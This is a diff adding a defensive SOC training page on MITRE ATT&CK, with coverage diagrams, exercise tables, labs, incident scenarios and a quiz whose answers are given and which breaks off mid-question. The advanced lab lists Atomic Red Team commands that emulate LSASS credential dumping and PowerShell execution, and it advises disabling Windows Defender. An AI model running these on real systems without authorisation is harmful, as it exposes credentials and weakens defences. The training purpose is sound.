+<b>A:</b> "Three main limitations: (1) ATT&CK is backward-looking — it catalogs techniques that have already been observed. It may not cover novel techniques that attackers develop. Detection should combine ATT&CK-based rules with behavioral baselines and anomaly detection. (2) ATT&CK doesn't capture context like attacker intent, skill level, or operational security — two attackers using the same technique could have very different goals and sophistication. (3) Coverage of all ATT&CK techniques doesn't equal security — an attacker needs only one technique to get in (e.g., a single successful phishing email), while defenders need to cover dozens of techniques across all tactics. Don't treat ATT&CK as a checklist — use it as a framework for understanding and prioritizing, not a measure of absolute security."
+</div>
+
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-diagram-3 me-2"></i>4. VISUAL DIAGRAMS</h6>
+<pre class="mermaid">
+flowchart TD
+    subgraph TacticFlow["ATT&CK Tactics Flow — Attack Lifecycle"]
+        direction LR
+        T1["Reconnaissance<br/>TA0043"] --> T2["Resource Dev<br/>TA0042"]
+        T2 --> T3["Initial Access<br/>TA0001"]
+        T3 --> T4["Execution<br/>TA0002"]
+        T4 --> T5["Persistence<br/>TA0003"]
+        T4 --> T6["Priv Escalation<br/>TA0004"]
+        T4 --> T7["Defense Evasion<br/>TA0005"]
+        T5 --> T8["Credential Access<br/>TA0006"]
+        T6 --> T8
+        T7 --> T8
+        T8 --> T9["Discovery<br/>TA0007"]
+        T9 --> T10["Lateral Movement<br/>TA0008"]
+        T10 --> T11["Collection<br/>TA0009"]
+        T11 --> T12["C2<br/>TA0011"]
+        T12 --> T13["Exfiltration<br/>TA0010"]
+        T12 --> T14["Impact<br/>TA0040"]
+    end
+    
+    subgraph Detection["Detection Coverage by Tactic"]
+        D1["TA0001: Initial Access<br/>12 tech — 8 covered ✅"]
+        D2["TA0002: Execution<br/>15 tech — 12 covered ✅"]
+        D3["TA0003: Persistence<br/>20 tech — 10 covered ⚠️"]
+        D4["TA0004: Privilege Escalation<br/>14 tech — 6 covered ⚠️"]
+        D5["TA0005: Defense Evasion<br/>42 tech — 18 covered ❌"]
+        D6["TA0006: Credential Access<br/>17 tech — 8 covered ⚠️"]
+        D7["TA0007: Discovery<br/>30 tech — 12 covered ⚠️"]
+        D8["TA0008: Lateral Movement<br/>10 tech — 7 covered ✅"]
+        D9["TA0009: Collection<br/>17 tech — 5 covered ❌"]
+        D10["TA0011: C2<br/>18 tech — 9 covered ⚠️"]
+        D11["TA0010: Exfiltration<br/>9 tech — 3 covered ❌"]
+        D12["TA0040: Impact<br/>13 tech — 6 covered ⚠️"]
+    end
+    
+    subgraph Engineering["Detection Engineering Cycle"]
+        E1["1. Research<br/>Read ATT&CK page"]
+        E2["2. Identify<br/>Log source & data"]
+        E3["3. Write Rule<br/>Sigma / SPL / KQL"]
+        E4["4. Test<br/>Atomic Red Team"]
+        E5["5. Deploy<br/>Monitor-only 2 weeks"]
+        E6["6. Tune<br/>Reduce FP &gt;30% to &lt;15%"]
+        E7["7. Production<br/>Full alerting enabled"]
+        E1 --> E2 --> E3 --> E4 --> E5 --> E6 --> E7
+        E7 --> E1["...next technique"]
+    end
+    
+    subgraph Coverage["Coverage Heatmap Legend"]
+        L1["🟢 Green: Rule exists, tested, FP &lt;15%"]
+        L2["🟡 Yellow: Partial coverage — needs work"]
+        L3["🔴 Red: No coverage — gap"]
+        L4["⚪ Gray: Not applicable"]
+    end
+</pre>
+
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-mortarboard me-2"></i>5. TRYHACKME SECTION</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Room</th><th style="color:#00d4ff;text-align:left;">Difficulty</th><th style="color:#00d4ff;text-align:left;">Objectives</th><th style="color:#00d4ff;text-align:left;">Completion Order</th></tr>
+<tr><td>MITRE ATT&CK 101</td><td>Easy</td><td>Understand ATT&CK basics — tactics, techniques, sub-techniques, matrix navigation, ID format</td><td>1</td></tr>
+<tr><td>MITRE ATT&CK 102</td><td>Medium</td><td>Map real attacks to ATT&CK techniques, identify TTPs from incident descriptions</td><td>2</td></tr>
+<tr><td>MITRE ATT&CK — Cyber Threat Intelligence</td><td>Medium</td><td>Use ATT&CK to structure CTI reports, identify threat actor TTP patterns, track technique evolution</td><td>3</td></tr>
+<tr><td>MITRE ATT&CK — Detection Engineering</td><td>Hard</td><td>Create detection rules mapped to ATT&CK techniques using Sigma, validate with ART, update coverage heatmap</td><td>4</td></tr>
+<tr><td>MITRE ATT&CK — Threat Hunting</td><td>Hard</td><td>Use ATT&CK Navigator to find coverage gaps, hypothesis-driven hunting using ATT&CK technique priorities</td><td>5</td></tr>
+<tr><td>ATT&CK by the Numbers</td><td>Medium</td><td>Analyze ATT&CK statistics, identify most common techniques per tactic, prioritize detection efforts</td><td>6</td></tr>
+<tr><td>Red Team TTPs — ATT&CK</td><td>Hard</td><td>Learn red team techniques through the ATT&CK lens — how red teams use specific techniques and how to detect them</td><td>7</td></tr>
+<tr><td>ATT&CK Framework — SOC Simulation</td><td>Medium</td><td>Full simulation: analyze APT report, map TTPs to ATT&CK, create detection rules, validate coverage</td><td>8</td></tr>
+</table>
+</div>
+
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-shield-shaded me-2"></i>6. HACK THE BOX ACADEMY SECTION</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Module</th><th style="color:#00d4ff;text-align:left;">Difficulty</th><th style="color:#00d4ff;text-align:left;">Learning Outcomes</th></tr>
+<tr><td>MITRE ATT&CK Fundamentals</td><td>Easy</td><td>Master all 14 tactics, 200+ techniques, 400+ sub-techniques — know the matrix and ID system</td></tr>
+<tr><td>ATT&CK for CTI Analysts</td><td>Medium</td><td>Structure threat intelligence reports using ATT&CK, identify and track threat actor TTPs over time</td></tr>
+<tr><td>ATT&CK for Detection Engineers</td><td>Medium</td><td>Map detection rules to ATT&CK, build coverage heatmaps, use ATT&CK Navigator API for automation</td></tr>
+<tr><td>ATT&CK for Purple Teaming</td><td>Hard</td><td>Run purple team exercises using ATT&CK, plan adversary emulation based on threat actor TTPs, validate coverage</td></tr>
+<tr><td>ATT&CK for SOC Managers</td><td>Medium</td><td>Use ATT&CK for metric reporting, resource allocation decisions, compliance demonstration, and risk communication</td></tr>
+<tr><td>Advanced ATT&CK — Threat Hunting</td><td>Hard</td><td>Advanced hunting techniques using ATT&CK as the foundation — hypothesis generation, data collection, analysis automation</td></tr>
+</table>
+</div>
+
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-shield-check me-2"></i>7. LETSDEFEND SECTION</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Investigation/Scenario</th><th style="color:#00d4ff;text-align:left;">Type</th><th style="color:#00d4ff;text-align:left;">Description</th></tr>
+<tr><td>SOC167 — MITRE ATT&CK SOC Simulation</td><td>SOC Simulation</td><td>Full simulation: receive APT29 intel report, map TTPs to ATT&CK, hunt for techniques in SIEM, report findings</td></tr>
+<tr><td>SOC189 — ATT&CK Coverage Analysis</td><td>SOC Simulation</td><td>Export SIEM rules, map to ATT&CK, build Navigator heatmap, identify top 5 gaps, create implementation plan</td></tr>
+<tr><td>SOC158 — TTP Analysis With MITRE ATT&CK</td><td>Analysis</td><td>Analyze a PCAP and event logs, identify attacker TTPs, map to ATT&CK techniques, write full TTP report</td></tr>
+<tr><td>SOC175 — Incident Response With ATT&CK</td><td>SOC Simulation</td><td>Respond to an active incident, map all attacker actions to ATT&CK IDs, create ATT&CK-mapped timeline</td></tr>
+<tr><td>SOC162 — Threat Actor Profiling With ATT&CK</td><td>Investigation</td><td>Given IoCs and behavioral data, identify which threat actor is responsible based on TTP patterns</td></tr>
+<tr><td>SOC179 — Purple Team Exercise With ATT&CK</td><td>SOC Simulation</td><td>Execute purple team where red team is evaluated on ATT&CK, blue team on detection coverage per technique</td></tr>
+</table>
+</div>
+
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-shield-fill me-2"></i>8. CYBERDEFENDERS SECTION</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Challenge</th><th style="color:#00d4ff;text-align:left;">Difficulty</th><th style="color:#00d4ff;text-align:left;">Description</th></tr>
+<tr><td>ATT&CK Navigator Baseline</td><td>Easy</td><td>Create a detection coverage heatmap for your SIEM — export rules, map to ATT&CK, create Navigator layer file</td></tr>
+<tr><td>Threat Actor Profile</td><td>Medium</td><td>Research APT29, Lazarus, or FIN7 — create detailed ATT&CK TTP profile, characteristic techniques, detection guidance</td></tr>
+<tr><td>Detection Gap Analysis</td><td>Medium</td><td>Coverage heatmap reveals 50% gaps — prioritize top 10, write Sigma rules for each, validate with ART</td></tr>
+<tr><td>Sigma-to-ATT&CK Mapping</td><td>Medium</td><td>Take 100+ Sigma rules from the SigmaHQ repo and ensure they have correct ATT&CK tags — fix any inconsistencies</td></tr>
+<tr><td>ATT&CK Automation Pipeline</td><td>Hard</td><td>Build automated pipeline: SIEM rules → ATT&CK mapping → Navigator JSON → Elastic dashboard → auto-updates weekly</td></tr>
+<tr><td>Adversary Emulation Plan</td><td>Hard</td><td>Design full adversary emulation plan based on a real threat actor's TTPs documented in ATT&CK — include execution scripts, detection validation, coverage reports</td></tr>
+</table>
+</div>
+
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-github me-2"></i>9. GITHUB RESOURCES</h6>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<table style="color:#c0d0e0;width:100%;">
+<tr><th style="color:#00d4ff;text-align:left;">Repository</th><th style="color:#00d4ff;text-align:left;">Purpose</th><th style="color:#00d4ff;text-align:left;">Skills Learned</th></tr>
+<tr><td><a href="https://github.com/keraattin/Blue-Team-Roadmap" style="color:#00d4ff;" target="_blank">Blue-Team-Roadmap</a></td><td>Blue team career path with ATT&CK-based skill tracking</td><td>Career planning, ATT&CK skill progression, technique mastery tracking</td></tr>
+<tr><td><a href="https://github.com/cyb3rxp/awesome-soc" style="color:#00d4ff;" target="_blank">awesome-soc</a></td><td>Curated SOC resources including ATT&CK-based tools and techniques</td><td>Tool discovery, ATT&CK integration, SOC optimization</td></tr>
+<tr><td><a href="https://github.com/SigmaHQ/sigma" style="color:#00d4ff;" target="_blank">sigma</a></td><td>Sigma rules with full ATT&CK mapping — 2,000+ rules each tagged with technique IDs</td><td>Sigma rule writing, ATT&CK mapping standards, rule attribution</td></tr>
+<tr><td><a href="https://github.com/redcanaryco/atomic-red-team" style="color:#00d4ff;" target="_blank">atomic-red-team</a></td><td>Tests organized by ATT&CK technique — validates detection for each specific technique ID</td><td>ATT&CK-based testing, detection validation, coverage gap identification</td></tr>
+<tr><td><a href="https://github.com/SwiftOnSecurity/sysmon-config" style="color:#00d4ff;" target="_blank">sysmon-config</a></td><td>Sysmon config organized by ATT&CK detection relevance</td><td>ATT&CK-aware logging configuration, detection data source optimization</td></tr>
+<tr><td><a href="https://github.com/aboutsecurity/blueteam_homelabs" style="color:#00d4ff;" target="_blank">blueteam_homelabs</a></td><td>Home lab setups with ATT&CK-based detection practice</td><td>Lab design, ATT&CK-based detection testing, coverage measurement</td></tr>
+<tr><td><a href="https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES" style="color:#00d4ff;" target="_blank">EVTX-ATTACK-SAMPLES</a></td><td>Event log samples organized by ATT&CK technique — perfect for testing detection rules</td><td>ATT&CK-specific log analysis, rule testing against real data, pattern recognition</td></tr>
+<tr><td><a href="https://github.com/InQuest/awesome-yara" style="color:#00d4ff;" target="_blank">awesome-yara</a></td><td>YARA rule resources — can be mapped to ATT&CK techniques</td><td>YARA rule writing, ATT&CK-based file detection, malware classification</td></tr>
+<tr><td><a href="https://github.com/A-poc/BlueTeam-Tools" style="color:#00d4ff;" target="_blank">BlueTeam-Tools</a></td><td>Blue team tools with ATT&CK mapping for each tool's capabilities</td><td>Tool proficiency, ATT&CK-aware tool selection, detection capability analysis</td></tr>
+</table>
+</div>
+
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-laptop me-2"></i>10. HANDS-ON LABS</h6>
+
+<p style="color:#00d4ff;font-weight:600;">Beginner Lab: ATT&CK Matrix Navigation and Technique Research</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Become proficient at navigating the MITRE ATT&CK website, understanding technique pages, and extracting detection and mitigation information.<br><br>
+<b>Setup:</b> Open browser to attack.mitre.org. No other tools needed.<br><br>
+<b>Step-by-Step:</b><br>
+1. Go to attack.mitre.org → Click "Enterprise Matrix" → Explore the 14 tactics as columns<br>
+2. Click on "Execution (TA0002)" → See all techniques under Execution<br>
+3. Click on "T1059 — Command and Scripting Interpreter" → See sub-techniques T1059.001 through T1059.009<br>
+4. Click on "T1059.001 — PowerShell" → Read the technique page completely<br>
+5. Answer these questions from the page:<br>
+   - What platforms does PowerShell run on?<br>
+   - What data sources are needed to detect PowerShell abuse?<br>
+   - What permissions are required for this technique?<br>
+   - What mitigations are recommended?<br>
+   - What real-world examples of PowerShell abuse are listed?<br>
+6. Repeat for T1003.001 (LSASS Memory), T1486 (Data Encrypted for Impact), T1021.001 (RDP)<br>
+7. Use the "Groups" tab → Find APT29 → List all techniques they use<br>
+8. Use the "Software" tab → Find Cobalt Strike → List all techniques it implements<br><br>
+<b>Expected Results:</b> You can navigate the ATT&CK matrix, find any technique, understand its page, and extract key information. You can find threat actor and software TTPs.<br><br>
+<b>Troubleshooting:</b> Can't find something? Use the search bar at the top of attack.mitre.org. ATT&CK IDs are case-sensitive — use "T1059.001" format.<br><br>
+<b>Detection Opportunities:</b> Compare the "Detection" section on each technique page with your current SIEM rules — what are you missing?
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Intermediate Lab: Build a Detection Coverage Heatmap with ATT&CK Navigator</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Create a detection coverage heatmap using ATT&CK Navigator. Export your SIEM rules, map them to ATT&CK techniques, visualize coverage, identify gaps.<br><br>
+<b>Setup:</b> Access to your SIEM rule list (or use the provided rule list), MITRE ATT&CK Navigator (mitre-attack.github.io/attack-navigator/), text editor for JSON.<br><br>
+<b>Step-by-Step:</b><br>
+1. Export all detection rules from your SIEM (or use 30 sample rules from the Sigma repository)<br>
+2. For each rule, determine the ATT&CK technique ID(s) it maps to — check tags field in Sigma rules<br>
+3. Create a JSON layer file for ATT&CK Navigator:<br>
+<code>{<br>
+  "name": "SOC Detection Coverage — Q2 2026",<br>
+  "version": "4.9",<br>
+  "domain": "mitre-enterprise",<br>
+  "description": "Detection coverage based on deployed SIEM rules",<br>
+  "techniques": [<br>
+    {"techniqueID": "T1059.001", "score": 100, "color": "#00ff00", "comment": "Rule: Suspicious PowerShell"},<br>
+    {"techniqueID": "T1003.001", "score": 50, "color": "#ffff00", "comment": "Partial — Sysmon EID 10 active but rule needs tuning"},<br>
+    {"techniqueID": "T1486", "score": 0, "color": "#ff0000", "comment": "No coverage — rule not written yet"}<br>
+  ]<br>
+}</code><br>
+4. Upload JSON to ATT&CK Navigator<br>
+5. Analyze the heatmap — which tactics have the most red (uncovered)?<br>
+6. Use Navigator's "Create Group" → Sort by score ascending to see worst-covered techniques<br>
+7. Use Navigator's "Create Group" → Sort by technique count per tactic to see which tactic has most gaps<br>
+8. Export heatmap as PNG and create a presentation for SOC management<br><br>
+<b>Expected Results:</b> Visual heatmap showing green/yellow/red coverage across all ATT&CK techniques. Clear identification of coverage gaps by tactic.<br><br>
+<b>Troubleshooting:</b> Navigator not loading layer? Check JSON syntax — trailing commas break JSON. Use a JSON validator. Score must be 0-100. Color must be hex code.<br><br>
+<b>Detection Opportunities:</b> Compare your heatmap with the "Top 10 Techniques Used by Ransomware" list — see if your coverage addresses the most dangerous threats.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Advanced Lab: Full ATT&CK-Based Adversary Emulation & Detection Validation</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>Objective:</b> Plan and execute a full adversary emulation exercise based on a real threat actor's TTPs as documented in ATT&CK. Emulate their behavior, validate detection coverage, identify gaps, and improve rules.<br><br>
+<b>Setup:</b> Windows VMs with Sysmon + EDR, SIEM with detection rules, Atomic Red Team installed, MITRE ATT&CK Navigator, ATT&CK technique pages for threat actor of choice (e.g., APT29, Lazarus, FIN7).<br><br>
+<b>Step-by-Step:</b><br>
+1. <b>Select Threat Actor:</b> Choose APT29 (Cozy Bear) — well-documented in ATT&CK with 40+ techniques.<br>
+2. <b>Research:</b> Go to attack.mitre.org/groups/G0016/ — APT29's page lists all techniques they've been observed using.<br>
+3. <b>Create Emulation Plan:</b> Select 10 techniques that form a realistic attack chain:<br>
+   - T1566.001 (Spearphishing Attachment) — initial access<br>
+   - T1204.002 (Malicious File) — user executes attachment<br>
+   - T1059.001 (PowerShell) — execution<br>
+   - T1003.001 (LSASS Memory) — credential access<br>
+   - T1053.005 (Scheduled Task) — persistence<br>
+   - T1021.001 (RDP) — lateral movement<br>
+   - T1087.001 (Local Account) — discovery<br>
+   - T1505.003 (Web Shell) — deploy web shell on web server<br>
+   - T1041 (Exfiltration Over C2) — exfiltrate data<br>
+   - T1486 (Data Encrypted for Impact) — ransomware deployment<br>
+4. <b>Pre-Exercise Coverage Baseline:</b> Before running tests, check which of these 10 techniques currently have detection rules. Create Navigator layer with baseline coverage.<br>
+5. <b>Execute Emulation:</b> Run each technique using Atomic Red Team:<br>
+<code>Invoke-AtomicTest T1566.001 -TestNumbers 1<br>
+Invoke-AtomicTest T1059.001 -TestNumbers 1,2,3<br>
+Invoke-AtomicTest T1003.001 -TestNumbers 1</code><br>
+6. <b>Collect Results:</b> For each test, record: Did SIEM alert? Which rule fired? Was severity correct? How long did detection take?<br>
+7. <b>Analysis:</b><br>
+   - Detection Rate: X out of 10 techniques detected by automated rules<br>
+   - Detection Speed: Average time from technique execution to alert<br>
+   - Coverage Gaps: Which techniques had no detection? Why?<br>
+   - Rule Quality: Did alerts have enough context? False positives during test?<br>
+8. <b>Improve:</b> Write Sigma rules for uncovered techniques, fix false positive issues, tune existing rules<br>
+9. <b>Re-Test:</b> Run the emulation again — verify improved detection rate<br>
+10. <b>Document:</b> Create final report with before/after coverage, detection rate improvement, new rules written, lessons learned<br><br>
+<b>Expected Results:</b> Measurable improvement in detection coverage for APT29 TTPs. Before: 4/10 covered. After: 9/10 covered. Coverage heatmap updated. New Sigma rules contributed to repository.<br><br>
+<b>Troubleshooting:</b> Atomic tests failing? Run PowerShell as Administrator. Disable Windows Defender temporarily. Check test prerequisites. Test doesn't generate expected logs? Check Sysmon and Windows audit policies are enabled.<br><br>
+<b>Detection Opportunities:</b> After this exercise, every new threat actor report should trigger an emulation plan — if a new APT is targeting your industry, you should be able to validate your coverage within hours.
+</div>
+
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-people me-2"></i>11. SOC SCENARIOS</h6>
+
+<p style="color:#00d4ff;font-weight:600;">Scenario 1: APT29 Attack Chain — Full ATT&CK Mapping</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>What Happened:</b> CISA warns of active APT29 (Cozy Bear) attacks targeting government contractors. Your SOC team finds evidence of a spearphishing campaign targeting your organization: executives received emails with malicious Word documents. An analyst discovers that one executive — j.doe@company.com — opened the attachment on their laptop.<br><br>
+<b>ATT&CK Mapping of the Full Attack Chain:</b><br><br>
+| Phase | ATT&CK ID | Technique | Evidence Found |
+|-------|-----------|-----------|----------------|
+| Initial Access | T1566.001 | Spearphishing Attachment | Email with "Project Proposal.docm" sent from compromised vendor email |
+| Execution | T1204.002 | Malicious File | User double-clicked .docm and enabled macros |
+| Execution | T1059.001 | PowerShell | Macro executed encoded PowerShell command |
+| Defense Evasion | T1027.010 | Command Obfuscation | PowerShell used -EncodedCommand with Base64 |
+| Persistence | T1053.005 | Scheduled Task | "WindowsUpdateTask" created in Task Scheduler |
+| Credential Access | T1003.001 | LSASS Memory | Sysmon EID 10 showed procexp64.exe accessing lsass.exe |
+| Discovery | T1087.001 | Local Account Discovery | net user /domain executed after credential access |
+| Lateral Movement | T1021.001 | Remote Desktop Protocol | RDP connection from j.doe-laptop to FILE-SERVER01 |
+| Collection | T1005 | Data from Local System | Files accessed on FILE-SERVER01 in "Contracts" share |
+| C2 | T1071.001 | Web Protocols | Beaconing to 45.33.32.156:443 every 60 seconds |
+| Exfiltration | T1041 | Exfiltration Over C2 Channel | 2 GB of data sent to C2 IP over 48 hours |
+| Impact | T1486 | Data Encrypted for Impact | Ransomware deployed on FILE-SERVER01 — files encrypted |<br><br>
+<b>How to Detect:</b> Using the ATT&CK mapping, you can create a multi-stage detection chain. Key detection opportunity: detect Office app spawning PowerShell (T1204.002 → T1059.001). This single detection catches the initial infection regardless of the specific macro or payload. Also create rules for: LSASS access from non-standard process (T1003.001), scheduled task creation from non-admin parent (T1053.005), RDP from workstation to server where user has never RDP'd before (T1021.001).<br><br>
+<b>How to Investigate:</b> (1) Confirm the initial email — check email gateway logs, extract the .docm attachment, analyze the macro, (2) Trace the PowerShell payload — decode the Base64, determine what was downloaded, (3) Check scheduled task — what does "WindowsUpdateTask" execute? When does it run? (4) Check all hosts the compromised user accessed — RDP logs, SMB connections, (5) Determine full scope — which files were accessed? Which were exfiltrated? (6) Check for encryption — were any files encrypted on FILE-SERVER01?<br><br>
+<b>How to Respond:</b><br>
+1. Isolate j.doe-laptop and FILE-SERVER01 immediately<br>
+2. Block C2 IP 45.33.32.156 at all firewalls and proxies<br>
+3. Disable j.doe's AD account and revoke all sessions<br>
+4. Delete the scheduled task "WindowsUpdateTask" on all affected hosts<br>
+5. Scan all email boxes for similar phishing emails — delete across organization<br>
+6. Reset passwords for j.doe and all users in Contracts department<br>
+7. Enable MFA for all external email access<br>
+8. Restore encrypted files from backup<br><br>
+<b>How to Document:</b> Create ATT&CK-mapped incident report with full timeline. Submit to CISA and threat intelligence sharing platforms with all IOCs. Update detection rules for the techniques that were missed.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Scenario 2: Coverage Gap Causes Blindness — Ransomware Spreads Unnoticed</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>What Happened:</b> Your SOC has 45% ATT&CK coverage (green in Navigator). A ransomware outbreak happens over a weekend, starting at Saturday 2:00 AM and running until Sunday 8:00 PM when a user reports they can't open files. The ransomware spread from an infected workstation through SMB to 47 file servers — all encrypted. Post-incident analysis reveals the attacker used techniques that fell in your 55% coverage gap.<br><br>
+<b>ATT&CK Analysis of What Was Missed:</b><br>
+| MISSED Technique | Why It Was Missed | Impact |
+|-----------------|-------------------|--------|
+| T1566.001 — Spearphishing | Email gateway rules only flagged known domains, missed newly registered domain (2 hours old) | Attacker got in |
+| T1059.003 — cmd.exe | Behavioral rule only monitored PowerShell, not cmd.exe | Execution not detected |
+| T1021.002 — SMB/Admin Shares | No SMB connection logging enabled on file servers | Lateral movement invisible |
+| T1053.005 — Scheduled Task | Rule existed but was disabled due to FPs from IT tasks | Persistence not flagged |
+| T1486 — Data Encrypted | Rule only checked for known ransomware extensions (.lockbit, .encrypted) — this ransomware used .crypted | Encryption not detected |
+| T1490 — Inhibit System Recovery | vssadmin.exe rule existed but didn't cover bcdedit.exe | Backup deletion not caught |
+| T1071.001 — Web Protocols C2 | Rule detected only non-standard port C2 — attacker used port 443 | C2 not flagged |<br><br>
+<b>How to Detect (Post-Incident Fixes):</b> Enable SMB logging on file servers via Event ID 5140 (network share access). Update ransomware extension list to include all known variants. Create command-line monitoring for vssadmin, bcdedit, wbadmin, diskshadow. Add anomaly detection for outbound data volumes. Enable NetFlow collection for lateral movement visibility.<br><br>
+<b>How to Investigate:</b> Patient zero: first host to show file encryption. Trace back: what user logged into that host first on Saturday? What email did they open? What domain did it come from? Trace lateral movement: which hosts accessed the file server via SMB? Check scheduled task creation events on all file servers. Determine if backup was compromised — check if backup accounts were used during the attack window.<br><br>
+<b>How to Respond:</b><br>
+1. Massive containment: isolate all 47 file servers and patient zero workstation<br>
+2. Block SMB (445) at all network segments — stop lateral movement completely<br>
+3. Determine if attacker still has access — check for active C2 connections<br>
+4. Restore from offline backups (air-gapped or immutable)<br>
+5. Implement immediate coverage improvements: enable SMB logging, update ransomware rules, re-enable scheduled task rule with better tuning<br>
+6. Run full purple team exercise covering the missed techniques to validate fixes<br><br>
+<b>How to Document:</b> Major incident report with ATT&CK gap analysis. Add section: "What Would Have Prevented This?" — answer: better ATT&CK coverage would have detected lateral movement. New policy: quarterly purple team exercises focusing on coverage gaps.
+</div>
+
+<p style="color:#00d4ff;font-weight:600;">Scenario 3: SOC Quarterly ATT&CK Coverage Review</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>What Happened:</b> The SOC manager calls a quarterly ATT&CK coverage review. The team exports all detection rules, generates a Navigator heatmap, and reviews coverage progress over the last quarter. Current coverage: 52% (up from 35% last quarter). Target: 70% by year end.<br><br>
+<b>Coverage Review Process:</b><br>
+1. <b>Export current rules</b> — SIEM admin exports all detection rules with their ATT&CK tags<br>
+2. <b>Generate Navigator layer</b> — Python script reads rules, creates coverage JSON, uploads to Navigator<br>
+3. <b>Compare to last quarter</b> — overlay Q1 layer on Q2 layer to see progress<br>
+4. <b>Review new rules added</b> — team presents new Sigma rules written this quarter (15 new rules covering 22 techniques)<br>
+5. <b>Review rules retired</b> — 3 rules removed (too noisy, technique no longer relevant)<br>
+6. <b>Review largest gaps</b> — Defense Evasion (TA0005) is still only 28% covered (up from 20%). Team discusses why: 42 techniques in this tactic, difficult to detect all variants. Prioritize: detect most common defense evasion techniques first (disabling security tools, obfuscation, process injection).<br>
+7. <b>Prioritize next quarter</b> — Based on latest threat intel (CISA reports Emotet resurgence), prioritize: T1059.001 (PowerShell), T1204.002 (Malicious File), T1055 (Process Injection), T1566.001 (Spearphishing).<br>
+8. <b>Assign owners</b> — Each L3 analyst assigned 3-5 techniques to create rules for next quarter<br>
+9. <b>Update CTI priority</b> — Threat intel team updates their monitoring to focus on techniques being added next quarter<br>
+10. <b>Report to management</b> — SOC manager presents: "We improved detection coverage from 35% to 52% this quarter. 18 new rules written. Next quarter target: 62%."<br><br>
+<b>How to Detect:</b> Maintain automated coverage reporting. Set up a cron job that runs weekly: export rules → map to ATT&CK → generate Navigator layer → save to shared drive with timestamp. Track coverage percentage in a Grafana chart showing trend line. Alert SOC manager if coverage drops (rule deleted without replacement).<br><br>
+<b>How to Investigate:</b> When new threat intel alerts on a specific technique, immediately check coverage — if red (uncovered), prioritize rule creation. If coverage is yellow (partial), review why — is the log source unreliable? FP rate too high?<br><br>
+<b>How to Document:</b> Quarterly ATT&CK Coverage Report: executive summary, coverage % by tactic, top 5 improvements this quarter, top 5 gaps remaining, action plan for next quarter, resources needed, target coverage %. Present to CISO.
+</div>
+
+<h6 class="text-warning mt-4 mb-2"><i class="bi bi-question-circle me-2"></i>12. KNOWLEDGE CHECK</h6>
+
+<p style="color:#00d4ff;font-weight:600;">Multiple Choice Questions</p>
+<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
+<b>1. What does "Tactic" represent in the MITRE ATT&CK framework?</b><br>
+a) The specific tool or malware used by the adversary<br>
+b) The adversary's goal or objective at a given stage<br>
+c) The operating system platform targeted<br>
+d) The vulnerability exploited<br>
+<strong style="color:#00d4ff;">Answer: b) The adversary's goal or objective at a given stage</strong><br><br>
+
+<b>2. How many tactics are in the Enterprise ATT&CK matrix?</b><br>
+a) 10<br>
+b) 12<br>
+c) 14<br>
+d) 20<br>
+<strong style="color:#00d4ff;">Answer: c) 14</strong><br><br>
+
+<b>3. What is the ATT&CK ID for "PowerShell" sub-technique?</b><br>
+a) T1059.001<br>
+b) T1059<br>
+c) T1003.001<br>
+d) T1566.001<br>
+<strong style="color:#00d4ff;">Answer: a) T1059.001</strong><br><br>
+
+<b>4. Which of the following is NOT an ATT&CK tactic?</b><br>
+a) Execution (TA0002)<br>
+b) Lateral Movement (TA0008)<br>
+c) Vulnerability Scanning (TA9999)<br>
+d) Impact (TA0040)<br>
+<strong style="color:#00d4ff;">Answer: c) Vulnerability Scanning (TA9999)</strong><br><br>
+
+<b>5. What is the difference between a Technique and a Sub-Technique?</b><br>
+a) Techniques are for enterprises, Sub-Techniques are for mobile<br>
+b) Sub-Techniques are more specific variants of a broader Technique<br>
+c) Techniques are used by APTs, Sub-Techniques by regular criminals<br>
+d) There is no difference<br>
+<strong style="color:#00d4ff;">Answer: b) Sub-Techniques are more specific variants of a broader Technique</strong><br><br>
+
+<b>6. Which MITRE tool is used to visualize detection coverage as a heatmap?</b><br>
+a) ATT&CK Navigator<br>
+b) CARET<br>
+c) CALDERA<br>
+d) D3FEND<br>
+<strong style="color:#00d4ff;">Answer: a) ATT&CK Navigator</strong><br><br>
+
+<b>7. What does T1003.001 (LSASS Memory) fall under?</b><br>
+a) Execution tactic<br>
+b) Credential Access tactic<br>
+c) Persistence tactic<br>
+d) Defense Evasion tactic<br>
+<strong style="color:#00d4ff;">Answer: b) Credential Access tactic</strong><br><br>
+
+<b>8. Which ATT&CK ID represents "Data Encrypted for Impact" (ransomware)?</b><br>
+a) T1486<br>
+b) T1490<br>
+c) T1566<br>
+d) T1059<br>
+<strong style="color:#00d4ff;">Answer: a) T1486</strong><br><br>
+
+<b>9. APT29 (Cozy Bear) is mapped to how many ATT&CK techniques?</b><br>
+a) 5-10<br>
+b) 15-20<br>
